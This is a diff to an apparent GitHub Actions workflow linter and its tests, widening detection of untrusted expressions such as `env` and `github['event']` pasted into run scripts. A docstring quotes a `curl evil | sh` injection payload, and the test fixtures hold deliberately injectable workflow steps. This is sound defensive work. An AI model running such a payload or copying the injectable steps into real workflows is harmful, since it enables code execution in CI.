@@ -281,9 +281,16 @@ def persisted_checkout_credentials(name: str, doc: Doc, text: str) -> list[str]:
 _EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)
 #: Contexts a person outside the repository can write, or that a workflow's
 #: caller supplies: an issue or pull request title, a commit message, a fork's
-#: branch name, a dispatch or reusable-workflow input. `github.event_name` is
-#: not matched; GitHub sets it.
-_UNTRUSTED = re.compile(r"\bgithub\s*\.\s*(?:event|head_ref)\b|\binputs\s*\.")
+#: branch name, a dispatch or reusable-workflow input, in the dotted form or
+#: the index form (`github['event']`). `env` is one of them: a variable set
+#: from any of those holds the same text, and `${{ env.TITLE }}` pastes it
+#: into the script exactly as the expression it was set from would. The
+#: lookbehind keeps a `steps.env.outputs` or `matrix.env` from matching.
+#: `github.event_name` is not matched; GitHub sets it.
+_UNTRUSTED = re.compile(
+    r"\bgithub\s*(?:\.\s*|\[\s*['\"])(?:event|head_ref)\b"
+    r"|(?<![\w.])(?:inputs|env)\b"
+)
 
 
 def untrusted_expressions_in_run(name: str, doc: Doc, text: str) -> list[str]:
@@ -291,7 +298,9 @@ def untrusted_expressions_in_run(name: str, doc: Doc, text: str) -> list[str]:
 
     GitHub substitutes `${{ ... }}` into the script text before the shell
     parses it, so a pull request titled `"; curl evil | sh; "` becomes shell
-    code. Passed through `env:` and read as `"$VAR"`, the same value is data.
+    code. Passed through `env:` and read as `"$VAR"`, the same value is data;
+    expanded back as `${{ env.VAR }}`, it is code again, so the `env` context
+    counts as untrusted here and the script reads the variable instead.
     `matrix`, `runner`, `steps.*.outputs` and `needs.*.outputs` expressions
     come from this repository's own files and stay allowed.
     """
@@ -546,6 +555,20 @@ VIOLATIONS: list[tuple[Rule, str, str]] = [
         "inputs.target",
     ),
     (
+        untrusted_expressions_in_run,
+        _extra_step(
+            '      - run: echo "${{ env.TITLE }}"\n'
+            "        env:\n"
+            "          TITLE: ${{ github.event.issue.title }}\n"
+        ),
+        "env.TITLE",
+    ),
+    (
+        untrusted_expressions_in_run,
+        _extra_step("      - run: echo ${{ github['event']['issue']['title'] }}\n"),
+        "github['event']",
+    ),
+    (
         privileged_triggers_and_inherited_secrets,
         _GOOD.replace("on:\n  push:\n", "on:\n  pull_request_target:\n"),
         "pull_request_target",
@@ -570,6 +593,28 @@ VIOLATIONS: list[tuple[Rule, str, str]] = [
         "releases/latest",
     ),
 ]
+
+
+@pytest.mark.parametrize(
+    ("expression", "untrusted"),
+    [
+        ("github.event.pull_request.title", True),
+        ("github['event'].issue.body", True),
+        ("github.head_ref", True),
+        ("inputs.target", True),
+        ("toJSON(inputs)", True),
+        ("env.TITLE", True),
+        ("env['TITLE']", True),
+        ("github.event_name", False),
+        ("github['event_name']", False),
+        ("steps.env.outputs.path", False),
+        ("matrix.environment", False),
+        ("needs.build.outputs.version", False),
+        ("runner.temp", False),
+    ],
+)
+def test_the_untrusted_context_pattern(expression: str, untrusted: bool) -> None:
+    assert bool(_UNTRUSTED.search(expression)) is untrusted
 
 
 @pytest.mark.parametrize(
